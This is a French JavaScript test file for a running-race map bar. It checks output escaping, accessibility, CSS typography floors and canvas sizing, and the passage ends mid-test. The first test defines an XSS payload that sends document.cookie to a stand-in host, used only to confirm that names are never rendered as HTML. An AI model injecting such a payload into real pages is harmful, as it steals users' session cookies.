// La barre course — ce qui ne se voit pas à l'œil et casse en silence.
//
// Quatre familles de régressions, toutes vécues, toutes vérifiables sans
// navigateur :
//   1. l'ÉCHAPPEMENT des noms tiers (un point de passage venu d'un GPX déposé
//      ou d'un lien /r/<id> publié par n'importe qui) ;
//   2. le TEXTE choisi selon l'état (barrière horaire, trace sans points de
//      passage, dernier point franchi) ;
//   3. l'ÉTAT ARIA du bouton Replier et l'inertie de la barre cachée ;
//   4. les PLANCHERS de la feuille de style (taille de police, interlignage
//      du Rosarivo) — un chiffre dans un CSS n'a pas d'autre gardien.
//
// ⚠️ On ne peut PAS importer src/ui/carnet-course.js ici : il importe une
// feuille .css, que node ne sait pas charger (le bundler s'en charge en
// production). C'est précisément pour ça que le CHOIX DES MOTS vit dans
// src/carnet-course.js, qui est pur : la règle est testable, et la couche DOM
// n'a plus qu'à poser des textContent. Ce qui reste dans le DOM est vérifié
// par lecture de source — grossier, mais c'est ça ou rien.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import {
  textesDuCarnet,
  phraseDuCarnet,
  libelleFenetrePentes,
  carnetALaLigne,
  prochaineBarriere,
  prochainRavitaillement,
  dureeRestante,
  deniveleRestant,
  PORTEE_PENTES,
} from '../src/carnet-course.js'
import { decroissant } from '../src/lissage.js'
// ⚠️ race-labels.js n'est pas importable ici non plus (il tire three.js et une
// feuille .css) : les tables de pictos sont donc lues dans la source.

const RACINE = path.join(path.dirname(fileURLToPath(import.meta.url)), '..')
const lire = (p) => fs.readFileSync(path.join(RACINE, p), 'utf8')
// ⚠️ LES COMMENTAIRES SONT DE LA PROSE, PAS DU CODE. Ce dépôt documente
// abondamment les pièges — donc il CITE le code fautif d'avant (« la version
// d'avant faisait el.innerHTML = … »). Scanner la source sans retirer les
// commentaires, c'est faire échouer un test sur la description du bug qu'il
// vérifie être corrigé.
const codeSeul = (src) => src
  .replace(/\/\*[\s\S]*?\*\//g, '')
  .replace(/(^|[^:'"`])\/\/.*$/gm, '$1')

const cumKm = [0, 1, 2, 3, 4, 5]
const eles = [1000, 1050, 1150, 1140, 1080, 1080]

// ============================================================ 1. échappement
test('un nom de point de passage hostile ne devient JAMAIS du HTML', () => {
  // Chemin d'attaque complet : je publie une course dont un point s'appelle
  // ainsi, j'envoie le lien /r/<id>, la victime lance la lecture. Le carnet
  // interpolait ce nom dans un el.innerHTML : la charge s'exécutait dans le
  // DOM de shibumap.com. share-link.js le dit lui-même — « anyone can POST to
  // the publish endpoint ».
  const charge = '<img src=x onerror=fetch("//moi/"+document.cookie)>'
  const c = carnetALaLigne({ cumKm, eles, waypoints: [{ km: 4, name: charge, pictos: [] }] }, 1)
  const t = textesDuCarnet(c)
  // le texte est rendu TEL QUEL par la couche pure — c'est voulu : il part en
  // textContent, qui ne peut pas exécuter. Ce qu'on vérifie ici, c'est que la
  // couche DOM ne le remet pas dans du HTML.
  assert.equal(t.prochainNom, charge)

  const ui = codeSeul(lire('src/ui/carnet-course.js'))
  // aucune interpolation de donnée dans un innerHTML : le seul innerHTML
  // toléré est celui des pictos, un dictionnaire de constantes du dépôt
  const innerHTMLs = [...ui.matchAll(/innerHTML\s*=\s*([^\n]+)/g)].map((m) => m[1].trim())
  for (const ligne of innerHTMLs) {
    assert.ok(
      /^PICTOS\[/.test(ligne) || /^''$/.test(ligne),
      `innerHTML avec du contenu non constant : ${ligne}`,
    )
  }
  // aucun gabarit HTML interpolé ne subsiste dans le rendu du carnet
  assert.ok(!/<span[^>]*\$\{/.test(ui), 'gabarit HTML interpolé dans le carnet')
  // et le titre de la barre, l'autre porte d'entrée d'un nom tiers
  assert.ok(/titleEl\.textContent\s*=/.test(lire('src/ui/course-bar.js')))
  // setResume garde un innerHTML : il ne voit QUE des nombres passés par nb()
  const cb = lire('src/ui/course-bar.js')
  const resume = cb.slice(cb.indexOf('function setResume('), cb.indexOf('function show()'))
  for (const m of resume.matchAll(/\$\{([^}]*)\}/g)) {
    assert.match(m[1], /^nb\(/, `setResume interpole autre chose qu’un nombre : ${m[1]}`)
  }
})

test('le carnet reconstruit son DOM par différence, pas par innerHTML', () => {
  // À 60 im/s, un el.innerHTML complet invalide la sélection de texte, le
  // curseur virtuel des lecteurs d'écran, et force un recalcul de style
  // synchrone juste avant que _drawProfile ne relise clientWidth.
  const ui = codeSeul(lire('src/ui/carnet-course.js'))
  assert.ok(/createElement/.test(ui), 'le DOM doit être construit une fois')
  assert.ok(/textContent/.test(ui), 'les valeurs doivent être posées en textContent')
  // update() ne doit pas remettre à plat la racine du panneau
  assert.ok(!/root\.innerHTML\s*=/.test(ui) && !/el\.innerHTML\s*=/.test(ui))
})

// ================================================================ 2. le texte
test('la BARRIÈRE HORAIRE a sa PROPRE rangée, telle qu’elle a été saisie', () => {
  // Elle était noyée dans la sous-ligne du prochain point (11 px, mono, gris,
  // derrière un « · »), c'est-à-dire au rang des étiquettes décoratives — pour
  // la seule donnée de tout le modèle qui puisse mettre un coureur HORS
  // COURSE. Elle sort du texte du prochain point et devient un champ à part.
  const wp = [{ km: 4, name: 'Col du Test', pictos: ['eau'], cutoff: '12h30', alt: 1840 }]
  const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: wp }, 1))
  assert.equal(t.prochainNom, 'Col du Test')
  assert.equal(t.aBarriere, true)
  assert.equal(t.barriere, '12h30')
  assert.ok(!t.prochainSous.includes('12h30'), 'la barrière ne doit plus être dans la sous-ligne')
  // chaîne LIBRE : on ne la parse pas, on la recopie (« J+1 04:00 » est un
  // cutoff valide sur un ultra de deux jours)
  const libre = [{ km: 4, name: 'Base', pictos: [], cutoff: 'J+1 04:00' }]
  assert.equal(textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: libre }, 1)).barriere, 'J+1 04:00')
  // pas de barrière saisie → pas de rangée montée, jamais une rangée vide
  const sans = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [{ km: 4, name: 'Col', pictos: [] }] }, 1))
  assert.equal(sans.aBarriere, false)
  assert.equal(sans.barriere, '')
})

test('le D+ jusqu’au prochain point n’est PLUS supprimé par la barrière', () => {
  // C'était une chaîne if/else if où le cutoff passait EN PREMIER : dès qu'un
  // organisateur avait saisi des barrières — le cas produit visé par Race
  // Studio — le coureur lisait « dans 5,4 km · barrière 12h30 » et ne pouvait
  // pas savoir que ces 5,4 km contiennent 700 m de montée. Or c'est le COUPLE
  // (distance, dénivelé) qui dit si la barrière est tenable. Et le chiffre
  // était déjà calculé à chaque image (ascentStats) puis jeté.
  const wp = [{ km: 4, name: 'Col du Test', pictos: [], cutoff: '12h30', alt: 1840 }]
  const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: wp }, 1))
  assert.match(t.prochainSous, /^dans 3,0 km · \+100 m$/)
})

test('la sous-ligne du prochain point garde UN seul complément', () => {
  // hauteur FIXE + overflow:hidden : un troisième bout passe à la ligne et se
  // fait rogner. Un seul complément, jamais plus — c'est ce qui rend la sortie
  // de la barrière possible sans toucher au budget de hauteur.
  const cas = [
    [{ km: 4, name: 'Col', pictos: [], alt: 1840 }], // ni D+ ni barrière → altitude
    [{ km: 4, name: 'Col', pictos: [], cutoff: '12h30', alt: 1840 }], // barrière ailleurs
  ]
  for (const wp of cas) {
    const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: wp }, 0))
    assert.equal(t.prochainSous.split('·').length, 2, t.prochainSous)
  }
})

test('« pas de donnée » ne s’écrit plus « 0 »', () => {
  // entier()/signe1() transformaient tout non-fini en 0 : une altitude
  // manquante s'affichait « 0 m » et une pente manquante « +0,0 % », un
  // mensonge plat posé avec l'aplomb d'une mesure. classePente() avait déjà
  // son palier 'inconnue' et le CSS le gérait — le chemin honnête existait,
  // il n'était pas alimenté côté texte.
  const t = textesDuCarnet({ km: 0, restant: 0, pente: NaN, alt: NaN, dplusRestant: NaN, aDesPoints: false })
  assert.equal(t.pente, '—')
  assert.equal(t.alt, '—')
  assert.equal(t.dplusRestant, '—')
  // et la phrase lue ne dit pas « pente — pour cent »
  assert.match(phraseDuCarnet({ km: 0, restant: 0, pente: NaN, alt: NaN, dplusRestant: NaN, aDesPoints: false }), /pente inconnue/)
})

test('sans point de passage, le carnet ne promet pas une « Arrivée »', () => {
  // le panneau se contredisait dès la première image : « Prochain / Arrivée »
  // à gauche d'un « 5,0 km restants »
  const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [] }, 0))
  assert.equal(t.aSuivant, false)
  assert.equal(t.prochainNom, '')
  assert.equal(t.depuis, '', 'pas de « Départ » figé sur une trace sans points')
  // la place lib\u00e9r\u00e9e sert \u00e0 l'altitude courante, qui \u00e9tait calcul\u00e9e et jet\u00e9e
  assert.match(t.alt, /^1.?000$/, `altitude attendue, re\u00e7u \u00ab ${t.alt} \u00bb`)
})

test('le point déjà franchi est relégué à la ligne « depuis »', () => {
  const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [{ km: 1, name: 'Ravito 1', pictos: [] }] }, 3))
  assert.equal(t.depuis, 'depuis Ravito 1')
  // avant le premier point, on le dit sans mentir sur un nom
  const t0 = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [{ km: 4, name: 'Col', pictos: [] }] }, 0))
  assert.equal(t0.depuis, 'depuis le départ')
})

test('le repère de portée de la bande de pente DÉRIVE de la constante', () => {
  // écrit en dur (« Pente des 2 prochains kilomètres »), il devenait faux en
  // silence le jour où on changeait le défaut de fenetreDePentes
  const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [] }, 0))
  assert.equal(t.portee, `+${PORTEE_PENTES} km`)
  assert.match(libelleFenetrePentes([{ classe: 'douce' }, { classe: 'raide' }]), new RegExp(`${PORTEE_PENTES} prochains`))
  // et l'étiquette DIT ce que la bande montre, au lieu de décrire la bande
  assert.match(libelleFenetrePentes([{ classe: 'douce' }, { classe: 'raide' }]), /douce, raide/)
})

test('la phrase du lecteur d’écran énonce les signes en toutes lettres', () => {
  const p = phraseDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [] }, 0))
  assert.ok(!p.includes('−') && !p.includes('+'), `signes bruts dans « ${p} »`)
  assert.match(p, /kilomètres restants/)
  assert.equal(phraseDuCarnet(null), '')
})

test('chaque picto a un libellé FRANÇAIS, pas sa clé interne', () => {
  // « ravito », « dodo », « wc » lus par un lecteur d'écran ne veulent rien
  // dire : l'information « il y a de l'eau au prochain point » restait
  // purement visuelle
  const src = lire('src/race-labels.js')
  const bloc = (nom) => {
    const i = src.indexOf(nom)
    assert.ok(i >= 0, `${nom} introuvable`)
    return src.slice(i, src.indexOf('\n})', i) + 3)
  }
  const cles = (blk) => [...blk.matchAll(/^\s{2}(\w+):/gm)].map((m) => m[1])
  const pictos = cles(src.slice(src.indexOf('export const PICTOS'), src.indexOf('export const PICTO_KEYS')))
  const libelles = bloc('export const LIBELLES_PICTOS')
  assert.ok(pictos.length >= 15, `${pictos.length} pictos lus, table mal découpée`)
  for (const cle of pictos) {
    const m = new RegExp(`^\\s{2}${cle}: (['"])(.+?)\\1,`, 'm').exec(libelles)
    assert.ok(m, `libellé manquant pour ${cle}`)
    assert.notEqual(m[2], cle, `${cle} : la clé interne n'est pas un libellé`)
  }
})

// ================================================================== 3. l'ARIA
test('le bouton Replier annonce son état dès le gabarit, et à la réouverture', () => {
  const js = lire('src/ui/course-bar.js')
  assert.match(js, /aria-expanded="true"/, 'état posé dès la construction')
  assert.match(js, /aria-controls="cb-body"/, 'le bouton doit dire ce qu’il replie')
  // un SEUL endroit écrit l'état, et show() l'appelle : replier, Quitter,
  // relancer une course laissait sinon la barre dépliée annoncée « replié »
  assert.match(js, /function syncCollapse\(/)
  const show = js.slice(js.indexOf('function show()'), js.indexOf('function hide()'))
  assert.match(show, /syncCollapse\(false\)/)
  assert.match(show, /bar\.inert = false/)
  assert.match(show, /\.focus\?\.\(\{ preventScroll: true \}\)/, 'le focus doit atterrir quelque part')
})

test('la barre cachée sort du parcours clavier, pas seulement de la souris', () => {
  // pointer-events NE BLOQUE PAS le clavier : les treize boutons restaient
  // tabulables sur des écrans où aucune course n'existe
  const js = lire('src/ui/course-bar.js')
  const hide = js.slice(js.indexOf('function hide()'))
  assert.match(hide, /bar\.inert = true/)
  const css = codeSeul(lire('src/ui/course-bar.css'))
  assert.match(css, /\.cb-bar\.cb-hidden\s*\{[^}]*visibility:\s*hidden/s)
  assert.match(css, /\.cb-collapsed \.cb-body\s*\{[^}]*visibility:\s*hidden/s)
})

test('Échap quitte le mode course, et seulement en mode course', () => {
  const main = lire('src/main.js')
  const bloc = main.slice(main.indexOf('function quitterModeCourse()'))
  assert.match(bloc, /e\.key !== 'Escape' \|\| !_enModeCourse/)
  assert.match(bloc, /_focusAvantCourse/, 'le focus doit être rendu à la sortie')
})

// ============================================================ 4. la feuille
test('aucun texte de la barre course ne descend sous 11 px', () => {
  // cinq styles vivaient entre 9 et 10 px, tous en encre à 55 % sur du verre
  // à travers lequel bouge un rendu 3D : les gros chiffres étaient lisibles et
  // personne ne pouvait lire ce qu'ils désignaient
  for (const f of ['src/ui/course-bar.css', 'src/ui/carnet-course.css']) {
    for (const m of codeSeul(lire(f)).matchAll(/font-size:\s*([\d.]+)px/g)) {
      assert.ok(parseFloat(m[1]) >= 11, `${f} : ${m[0]} sous le plancher de 11 px`)
    }
  }
})

test('la barre course passe par l’échelle typographique, pas par des pixels', () => {
  // douze tailles cohabitaient dans 152 px de haut, dont trois pour le même
  // rôle sémantique. Les seuls px littéraux tolérés vivent dans v28.css.
  const v28 = lire('src/ui/v28.css')
  for (const t of ['micro', 'unit', 'body', 'num', 'hero']) {
    assert.match(v28, new RegExp(`--ce-t-${t}:\\s*\\d`), `jeton --ce-t-${t} absent`)
  }
  for (const f of ['src/ui/course-bar.css', 'src/ui/carnet-course.css']) {
    const px = [...codeSeul(lire(f)).matchAll(/font-size:\s*([\d.]+)px/g)]
    assert.equal(px.length, 0, `${f} : ${px.length} taille(s) en dur, utiliser --ce-t-*`)
  }
})

test('le Rosarivo du titre garde de quoi poser ses jambages', () => {
  // le dépôt a DÉJÀ payé ce bug (v28.css .ce-hubq : « le g de design était
  // tranché net »). Interlignage serré + overflow:hidden = « Trail du Puy »,
  // « Grand Raid », « Marathon de Gap » rognés.
  const bloc = codeSeul(lire('src/ui/course-bar.css')).match(/\.cb-title\s*\{[^}]*\}/s)[0]
  const lh = parseFloat(/line-height:\s*([\d.]+)/.exec(bloc)[1])
  assert.ok(lh >= 1.18, `line-height ${lh} : les descendantes du Rosarivo sortent`)
  assert.match(bloc, /padding-bottom:\s*0\.1\d+em/)
})

test('la zone de lecture est un creux, pas une cellule de tableau', () => {
  // le commentaire jurait « sans découper la barre en trois boîtes » et le
  // code posait juste en dessous un fond teinté ET deux filets verticaux
  const css = codeSeul(lire('src/ui/course-bar.css'))
  const bloc = css.match(/\.cb-zone-lecture\s*\{[^}]*\}/s)[0]
  assert.ok(!/border-left/.test(bloc) && !/border-right/.test(bloc), bloc)
})

test('--cb-body-h est DÉCLARÉ, pas seulement invoqué', () => {
  // `height: var(--cb-body-h, 152px)` renvoyait à une variable qui n'existait
  // nulle part : un nombre magique déguisé en réglage, et un commentaire de
  // carnet-course.css qui envoyait le lecteur la chercher pour rien
  const css = codeSeul((lire('src/ui/course-bar.css')))
  assert.match(css, /\.cb-bar\s*\{[^}]*--cb-body-h:\s*\d+px/s)
  assert.ok(!/var\(--cb-body-h,/.test(css), 'plus de valeur de repli : le jeton existe')
  // et il sert : le responsive ne peut pas ne regarder que la largeur (barre à
  // 51 % de l'écran sur un téléphone en paysage)
  assert.match(css, /@media \(max-height:/)
})

test('les chiffres de la course vivent dans la TÊTE, pas sous le profil', () => {
  // sous le profil, ils lui laissaient ~57 px d'amplitude verticale pour
  // dessiner 2 000 m de dénivelé sur 770 px de large — 35 m par pixel, le
  // « profil totalement écrasé » d'Adrien, corrigé horizontalement seulement
  const js = lire('src/ui/course-bar.js')
  const tete = js.slice(js.indexOf('<div class="cb-head">'), js.indexOf('<div class="cb-body"'))
  assert.match(tete, /<dl class="cb-chiffres">/, 'les chiffres doivent être dans la tête')
  const parcours = js.slice(js.indexOf('cb-zone-parcours'), js.indexOf('cb-zone-lecture'))
  assert.ok(!/cb-chiffres/.test(parcours), 'plus rien ne partage la hauteur du profil')
  // et le D− cesse d'être calculé puis jeté
  assert.match(js, /nb\(r\.dminus\)/)
})

test('les contrôles de la barre sont CEUX du système, pas des sosies', () => {
  // v28.css définit déjà un segmenté, un bouton d'icône et un bouton texte, et
  // kit.js expose les trois usines. La barre les redessinait à la main, avec
  // des valeurs qui avaient dérivé sur chaque axe : rail à 14 % au lieu de 5 %,
  // rayon 999 au lieu de 10, hauteur 30 au lieu de 26, puce active sur
  // --ce-porcelain au lieu de --ce-glass-strong, 13 px mono au lieu de 11,5 px
  // d'interface, Quitter en graisse 400 quand tous les boutons texte du produit
  // sont en 600. La barre était la seule surface de ShibuMap dont les contrôles
  // ne ressemblaient à aucun autre écran.
  const js = lire('src/ui/course-bar.js')
  for (const [quoi, classe] of [
    ['cb-collapse', 'ce-icon-btn'], ['cb-quit', 'ce-btn'],
    ['cb-speed-btn', 'ce-seg-btn'], ['cb-cam-btn', 'ce-icon-btn'],
    ['cb-speeds', 'ce-seg'],
  ]) {
    assert.match(js, new RegExp(`${quoi}[^\\n'\`"]*${classe}|${classe}[^\\n'\`"]*${quoi}`), `${quoi} doit porter ${classe}`)
  }
  // et les blocs locaux ne redéclarent plus la géométrie du système
  const css = codeSeul(lire('src/ui/course-bar.css'))
  for (const sel of ['cb-cam-btn', 'cb-speed-btn', 'cb-quit']) {
    const bloc = css.match(new RegExp(`\\.${sel}\\s*\\{[^}]*\\}`, 's'))
    assert.ok(bloc, `.${sel} introuvable`)
    assert.ok(!/(^|[^-])border-radius:/.test(bloc[0]), `.${sel} redéclare le rayon du système`)
    assert.ok(!/\bheight:/.test(bloc[0]) && !/\bwidth:/.test(bloc[0]), `.${sel} redéclare la taille du système`)
  }
})

test('les cibles pointeur des contrôles atteignent le minimum WCAG 2.5.8', () => {
  // le seuil est désormais tenu par v28.css, puisque la barre utilise ses
  // composants : c'est LÀ qu'il faut le garder.
  const v28 = codeSeul(lire('src/ui/v28.css'))
  const taille = (sel, prop) => {
    const m = v28.match(new RegExp(`\\${sel}\\s*\\{[^}]*${prop}:\\s*(\\d+)px`, 's'))
    assert.ok(m, `${sel} { ${prop} } introuvable`)
    return parseInt(m[1], 10)
  }
  assert.ok(taille('.ce-icon-btn', 'width') >= 24, '.ce-icon-btn sous 24 px')
  assert.ok(taille('.ce-icon-btn', 'height') >= 24, '.ce-icon-btn sous 24 px')
  assert.ok(taille('.ce-seg-btn', 'height') >= 24, '.ce-seg-btn sous 24 px')
  assert.ok(taille('.ce-btn', 'height') >= 24, '.ce-btn sous 24 px')
})

// ================================================ 5. le canvas et son cycle
test('le profil ne dessine JAMAIS dans une boîte non posée', () => {
  // ⚠️ LE BUG LE PLUS GRAVE DE LA BARRE, et il vient des deux états que le
  // client a explicitement demandés : le repli (.cb-collapsed .cb-body
  // { height: 0 }) et le téléphone (.cb-zone-parcours { display: none }).
  // Tous deux mettent clientWidth/clientHeight à 0 SANS arrêter la lecture.
  // Le repli `cv.clientWidth || cv.width` retombait alors sur la taille du
  // BITMAP, qu'on multipliait ensuite par la densité d'écran : avec dpr = 2,
  // cv.width = 2 × cv.width à chaque image — 800, 1600, 3200, 6400… La limite
  // de canvas du navigateur était franchie en une fraction de seconde,
  // pendant que la scène 3D tourne. Sur dpr = 1 c'était inoffensif : voilà
  // pourquoi personne ne l'avait vu.
  const gpx = codeSeul(lire('src/gpx.js'))
  // ⚠️ la DÉFINITION, pas les call sites : `_drawProfile()` apparaît plus haut
  // dans le fichier comme appel (`this._drawProfile()`), et découper là-dessus
  // ramassait un tout autre bloc de code
  const bloc = gpx.slice(gpx.indexOf('\n  _drawProfile() {'), gpx.indexOf('pointerMove('))
  assert.ok(!/clientWidth\s*\|\|\s*cv\.width/.test(bloc), 'plus aucun repli sur la taille du bitmap')
  assert.ok(!/clientHeight\s*\|\|\s*cv\.height/.test(bloc), 'plus aucun repli sur la taille du bitmap')
  assert.match(bloc, /if \(!cv\.clientWidth \|\| !cv\.clientHeight\) return/, 'sortie avant tout travail')
  // et la sortie doit précéder le calcul des altitudes, sinon on paie
  // _elevations() à chaque image pour une barre repliée
  assert.ok(bloc.indexOf('!cv.clientHeight') < bloc.indexOf('this._elevations()'))
})

test('_elevations() est mémoïsé, et invalidé là où il doit l’être', () => {
  // quatre appels par image de lecture (setHover, _drawProfile, le carnet,
  // _updateHead), chacun refaisant un map() sur toute la trace : ~4 tableaux
  // neufs par image. Le commentaire de main.js en comptait deux.
  const gpx = codeSeul(lire('src/gpx.js'))
  assert.match(gpx, /_elesCache/, 'pas de cache d’altitudes')
  // la clé couvre ce dont le résultat dépend
  for (const cle of ['_elesDem', '_elesExag', '_elesTrack']) {
    assert.match(gpx, new RegExp(cle), `clé d’invalidation ${cle} absente`)
  }
  // rebuild() réécrit track.world EN PLACE : le cache ne peut pas le voir seul
  const rebuild = gpx.slice(gpx.indexOf('  rebuild() {'), gpx.indexOf('  _disposeArches()'))
  assert.match(rebuild, /this\._elesCache = null/, 'rebuild() doit purger le cache')
  // et le commentaire de main.js ne doit plus annoncer un compte faux
  assert.ok(!/une fois par image par le profil et une fois par le carnet/.test(lire('src/main.js')))
})

// =========================================== 6. la hiérarchie du coureur
test('la PENTE chiffrée a cédé sa rangée à la barrière horaire', () => {
  // elle était représentée QUATRE fois simultanément : sa valeur chiffrée en
  // 17 px colorés, la bande des 2 km à venir, le profil altimétrique dans la
  // même barre, et le relief 3D lui-même. La barrière, elle, était en 11 px.
  const ui = codeSeul(lire('src/ui/carnet-course.js'))
  assert.ok(!/duo\('Pente'\)/.test(ui), 'plus de rangée chiffrée « Pente »')
  assert.match(ui, /duo\('Barrière'/, 'la barrière doit avoir sa rangée')
  assert.match(ui, /cc-v-limite/, 'la barrière porte la teinte sémantique')
  // la bande, elle, RESTE : c'est la seule des quatre à être prospective
  assert.match(ui, /majBande/)
  // et la teinte de pente a suivi la bande, elle n'est plus sur .cc-v
  const css = codeSeul(lire('src/ui/carnet-course.css'))
  assert.ok(!/\.cc-v\[data-classe/.test(css), 'la teinte de pente ne vit plus sur la valeur')
  assert.match(css, /\.cc-v-limite\s*\{[^}]*--cc-raide/s)
})

test('la bande de pente n’encode pas sa donnée par la seule couleur', () => {
  // en deutéranopie, --cc-douce / -soutenue / -raide convergent vers des ocres
  // voisins de luminance très proche, et 'inconnue' (fond nu) devenait
  // indistinguable d'un segment absent. La hauteur est le second canal, et
  // elle est gratuite : la bande fait toujours 9 px.
  const css = codeSeul(lire('src/ui/carnet-course.css'))
  const h = (classe) => {
    const m = css.match(new RegExp(`\\.cc-slope i\\[data-classe='${classe}'\\]\\s*\\{[^}]*height:\\s*(\\d+)%`, 's'))
    assert.ok(m, `pas de hauteur pour '${classe}'`)
    return parseInt(m[1], 10)
  }
  assert.ok(h('douce') < h('soutenue') && h('soutenue') < h('raide'), 'la sévérité doit monter')
})

test('le D− RESTANT remplace l’altitude qui redoublait la pastille', () => {
  // la pastille du profil affiche déjà « 1240 m · km 12,4 » collée à la tête
  // de lecture, donc mieux placée. C'est le raisonnement qui avait fait
  // masquer .cc-km au-dessus de 680 px — il n'était pas appliqué à l'altitude.
  // ⚠️ ET LA VALEUR N'EST PLUS UN SOMMET. Le carnet affichait ici le point
  // culminant restant — une ALTITUDE, 1150 m à l'index 1 — sous un libellé qui
  // promet un DÉNIVELÉ NÉGATIF. deniveleRestant() (carnet-course.js) calcule
  // désormais la vraie descente cumulée jusqu'à l'arrivée, à la même
  // hystérésis que le D+ : 70 m ici (1150→1140→1080, hystérésis 8), pas 1150.
  const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [] }, 1))
  assert.equal(t.aDMoinsRestant, true)
  assert.equal(t.dMoinsRestant, '70', `dénivelé négatif attendu, reçu « ${t.dMoinsRestant} »`)
  // pas de balayage inutile quand il y a un prochain point : le D− restant ne
  // sert que dans le cas « pas de point de passage » (même contrat que l'ancien
  // sommetRestant, juste une autre donnée dessous)
  const avec = carnetALaLigne({ cumKm, eles, waypoints: [{ km: 4, name: 'Col', pictos: [] }] }, 1)
  assert.equal(avec.dMoinsRestant, null)
  // et le CSS choisit laquelle des deux rangées parle, selon que le profil est
  // là ou non
  const css = codeSeul(lire('src/ui/carnet-course.css'))
  assert.match(css, /\.cc-stat\.cc-stat-alt\s*\{\s*display:\s*none/)
  assert.match(css, /@media \(max-width: 680px\)[^}]*\{[\s\S]*?cc-stat-dmoins[^}]*display:\s*none/)
})

test('les pictos du prochain point sont triés par IMPORTANCE, et la coupe se voit', () => {
  // `suivant.pictos` arrive dans l'ordre de saisie de l'organisateur
  // (ui/studio.js pousse au fil des clics, sans jamais trier) : borné à trois,
  // on pouvait afficher « WC, point de vue, col » et taire le poste de secours
  // et l'eau sur une base de vie.
  const rl = lire('src/race-labels.js')
  const m = /export const ORDRE_PICTOS = Object\.freeze\(\[([\s\S]*?)\]\)/.exec(rl)
  assert.ok(m, 'ORDRE_PICTOS absent de race-labels.js')
  const ordre = [...m[1].matchAll(/'([\w]+)'/g)].map((x) => x[1])
  assert.ok(ordre.indexOf('secours') < ordre.indexOf('wc'), 'le secours passe avant les WC')
  assert.ok(ordre.indexOf('eau') < ordre.indexOf('vue'), 'l’eau passe avant le point de vue')
  // toute clé affichable doit avoir un rang, sinon le tri est partiel
  const cles = [...(/export const PICTO_KEYS = \[([^\]]*)\]/.exec(rl)[1]).matchAll(/'([\w]+)'/g)].map((x) => x[1])
  for (const c of cles) assert.ok(ordre.includes(c), `${c} n’a pas de rang dans ORDRE_PICTOS`)
  // et le rendu trie AVANT de couper, puis dit combien il en reste
  const ui = codeSeul(lire('src/ui/carnet-course.js'))
  assert.ok(ui.indexOf('rangPicto') < ui.indexOf('slice(0, MAX_PICTOS)'), 'trier avant de couper')
  assert.match(ui, /cc-picto-plus/, 'la troncature doit être visible')
})

// ================================================ 7. accessibilité, encore
test('la région live ne sature plus la synthèse vocale', () => {
  // 1 200 ms pour une phrase qui demande six à dix secondes à dire : la file
  // d'annonces ne se vidait jamais, on n'entendait que des débuts de phrase,
  // et plus AUCUNE autre annonce de la page ne pouvait passer.
  const ui = codeSeul(lire('src/ui/carnet-course.js'))
  const ms = /const SR_MS = (\d+)/.exec(ui)
  assert.ok(ms && parseInt(ms[1], 10) >= 5000, `SR_MS = ${ms?.[1]} : trop court pour une phrase`)
  // et on ne réécrit que sur CHANGEMENT : remplacer un nœud texte par le même
  // texte relance quand même l'annonce (à 0,5×, la phrase arrondie est souvent
  // identique d'un tick au suivant)
  assert.match(ui, /srPhrase/, 'la phrase précédente doit être mémorisée')
  assert.match(ui, /if \(p !== vu\.srPhrase\)/)
})

test('« encore loin » se DIT, il ne se voit pas seulement', () => {
  // l'état « loin » était le seul rendu à 45 % d'opacité, sur du verre,
  // au-dessus d'un rendu 3D qui bouge — très en dessous du 3:1 de WCAG 1.4.11
  // pour un graphique porteur de sens — et il n'avait AUCUN équivalent
  // textuel : l'aria-label était le même mot de près comme de loin.
  const ui = codeSeul(lire('src/ui/carnet-course.js'))
  assert.match(ui, /plus loin/, 'le drapeau « loin » doit exister dans le texte')
  const css = codeSeul(lire('src/ui/carnet-course.css'))
  const bloc = css.match(/\.cc-picto\[data-loin\]\s*\{[^}]*\}/s)[0]
  assert.ok(!/opacity/.test(bloc), 'plus de graduation par l’opacité seule')
  assert.match(bloc, /box-shadow|background/, 'la graduation passe par la surface')
})

test('la barre est une RÉGION nommée par le nom de la course', () => {
  // le mode course fait disparaître toute l'interface et dépose le focus sur
  // Lecture : sans rôle ni nom accessible, un lecteur d'écran annonçait
  // « Lecture, bouton » et rien d'autre — ni que les panneaux venaient d'être
  // retirés, ni comment nommer la zone où l'utilisateur vient d'atterrir.
  const js = lire('src/ui/course-bar.js')
  assert.match(js, /setAttribute\('role', 'region'\)/)
  assert.match(js, /aria-labelledby', 'cb-titre'/)
  assert.match(js, /<h2 class="cb-title" id="cb-titre">/)
})

test('les icônes de la barre sont des TRACÉS, y compris les trois dernières', () => {
  // course-bar.js condamne explicitement les icônes bricolées en bordures CSS
  // et l'avait déjà payé une fois — mais le triangle de lecture (border-width
  // 7/0/7/12), la pause (une barre de 4 px doublée par un box-shadow) et le
  // chevron de repli (un carré à deux bordures tourné à 45°) l'étaient encore.
  // La pause était en prime DÉCENTRÉE de 2,4 px sur le seul objet à contraste
  // maximal de l'écran.
  const css = codeSeul(lire('src/ui/course-bar.css'))
  assert.ok(!/\.cb-play::before/.test(css), 'le glyphe de lecture doit être un svg')
  assert.ok(!/\.cb-collapse::before/.test(css), 'le chevron doit être un svg')
  assert.ok(!/box-shadow:\s*8px/.test(css), 'plus de pause en box-shadow')
  const js = lire('src/ui/course-bar.js')
  for (const n of ['ICONE_LECTURE', 'ICONE_PAUSE', 'ICONE_CHEVRON']) assert.match(js, new RegExp(n))
})

test('le titre a son propre palier, au-dessus des chiffres de la tête', () => {
  // titre et valeurs étaient tous deux en --ce-t-num : à taille égale un mono
  // gras l'emporte optiquement sur un serif en 400, donc le nom de la course —
  // seul geste éditorial de l'écran, demande n°7 — était l'élément le plus
  // faible de sa propre ligne.
  const v28 = lire('src/ui/v28.css')
  const t = (nom) => parseInt(new RegExp(`--ce-t-${nom}:\\s*(\\d+)px`).exec(v28)[1], 10)
  assert.ok(t('title') > t('num'), 'le titre doit dominer les chiffres de la tête')
